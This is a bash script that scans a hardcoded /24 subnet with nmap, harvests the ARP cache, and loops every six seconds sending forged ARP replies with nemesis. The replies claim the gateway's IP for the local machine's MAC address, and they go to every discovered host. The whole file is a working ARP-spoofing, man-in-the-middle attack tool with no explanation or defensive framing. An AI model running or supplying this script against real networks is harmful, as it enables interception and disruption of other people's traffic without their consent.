#!/bin/bash
gateway=`ping -c 1 $(route|grep default | awk -F ' ' '{print $2}') |grep PING |awk -F ' ' '{print $3}'|awk -F '(' '{print $2}' |awk -F ')' '{print $1}'`
while true
do
echo "start... find hosts"
nmap -sn 167.13.0.0/24 |grep for > .tmp
awk -F ' ' '{print $5}' .tmp > .hosts
rm .tmp
echo "ping hosts..."
for ipaddr in `cat .hosts`
	do
	ping -c 1 $ipaddr|grep ping | awk -F ' ' '{print $2}'
	done
arp -na |grep ether |awk -F ' ' '{print $2, $4}'|awk -F '(' '{print $2}' |awk -F ')' '{print $1, $2}' > .arpcache
rm .hosts
hmac_addr=`ifconfig |grep  eth0 | awk -F ' ' '{print $6}'`
cat .arpcache |grep -w -v  $gateway > .tmp
cat .tmp > .arpcache
rm .tmp
cat .arpcache|awk -F ' ' '{print $1}' > .arpcachei
cat .arpcache|awk -F ' ' '{print $2}' |tr '\n' ' ' > .arpcachemac
rm .arpcache
i=0
echo "inject ip address:"
for ipaddr in `cat .arpcachei`
	do
	i=`expr $i + 1`
	varmac=`cat .arpcachemac |awk -v t=$i -F ' ' '{print $t}'`
	echo $ipaddr
	#echo "nemesis arp -r -d eth0 -S $gateway -D $ipaddr -h $hmac_addr -m $varmac -H $hmac_addr -M $varmac"
	sudo nemesis arp -r -d eth0 -S $gateway -D $ipaddr -h $hmac_addr -m $varmac -H $hmac_addr -M $varmac
	done
echo done
echo sleep 6
rm .arpcachei
rm .arpcachemac
sleep 6
done

